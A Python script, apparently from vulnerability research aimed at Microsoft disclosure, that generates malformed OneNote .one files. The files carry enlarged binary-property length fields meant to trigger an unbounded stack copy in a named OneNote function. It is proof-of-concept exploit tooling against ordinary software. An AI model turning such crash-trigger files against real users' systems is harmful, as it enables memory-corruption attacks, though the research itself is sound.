#!/usr/bin/env python3
"""Size-invariant carriers for the Jot find-path stack copy.

Every `ty==7` (VT_BINARY) property value in the base .one gets a variant whose declared
`cbData` dword is enlarged while the file keeps its exact byte length. The find-path sink
(onmain!CFindPageHitList::IsPageHit, 20092 rva 0xF1C5D8/0xF1C5E8) takes the value's atom,
reads `[atom+4] & 0x3fffffff` and copies that many bytes to `sp+0x10`, a slot the function
itself fills with 16+4 bytes before the copy and hashes 5 DWORDs from afterwards; there is no
comparison against 0x14 anywhere in the function.

Usage: mk_pagekey_carriers.py <base.one> <out_dir>
Manifest lines: name  jcid  prtid  value_off  cb_old  cb_new  ty  byte_length_unchanged
"""
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, "/Users/nonoge/Desktop/src_all_in_one/findings/MSRC/M365-Insider/onenote-onestore-hunt-20260902")

from s2map import S2  # noqa: E402  (the authoritative .one object/property walker)

LENS_SMALL = (0x21, 0x100, 0x1000)   # sites whose declared length is <= 0x40
LENS_BIG = (0x1000,)                   # larger values get one tier each (keeps the corpus small)

base = sys.argv[1] if len(sys.argv) > 1 else "s2.one"
outdir = sys.argv[2] if len(sys.argv) > 2 else "carriers_pk"
prefix = sys.argv[3] if len(sys.argv) > 3 else "pk"
os.makedirs(outdir, exist_ok=True)

s = S2(base)
rows = []
for r in s.decls:
    for pr in r.props:
        if pr.ty != 7:
            continue
        try:
            n = struct.unpack_from("<I", s.d, pr.off)[0]
        except Exception:
            continue
        if not (0 < n <= 0x4000):
            continue
        if pr.off + 4 + n > len(s.d):
            continue
        rows.append((r.jcid, pr.pid, pr.off, n))

# one site per distinct (jcid, prtid, offset); the walker reports the same object several times
seen = set()
sites = []
# PK_ONE_PER_PID=1 keeps only the first site per (jcid, prtid): one runner batch can then cover
# every distinct property identity in both bases instead of every occurrence.
one_per = os.environ.get("PK_ONE_PER_PID") == "1"
for jcid, pid, off, n in rows:
    key = (jcid, pid, off) if not one_per else (jcid, pid)
    if key in seen:
        continue
    seen.add(key)
    sites.append((jcid, pid, off, n))

print("base=%s size=%d ty7_sites=%d" % (os.path.basename(base), len(s.d), len(sites)))
made = 0
for idx, (jcid, pid, off, n) in enumerate(sites):
    for L in (LENS_SMALL if n <= 0x40 else LENS_BIG):
        if L <= n:
            continue
        d = bytearray(s.d)
        struct.pack_into("<I", d, off, L)
        assert len(d) == len(s.d)
        name = "%s_%03d_j%04x_p%04x_L%x.one" % (prefix, idx, jcid & 0xFFFF, pid & 0xFFFF, L)
        with open(os.path.join(outdir, name), "wb") as f:
            f.write(bytes(d))
        print("%s jcid=0x%04X prtid=0x%04X off=0x%x cb_old=%d cb_new=%d unchanged=True" %
              (name, jcid, pid, off, n, L))
        made += 1
with open(os.path.join(outdir, "manifest.txt"), "w") as f:
    f.write("base=%s size=%d sites=%d files=%d\n" % (base, len(s.d), len(sites), made))
print("wrote %d carriers to %s" % (made, outdir))
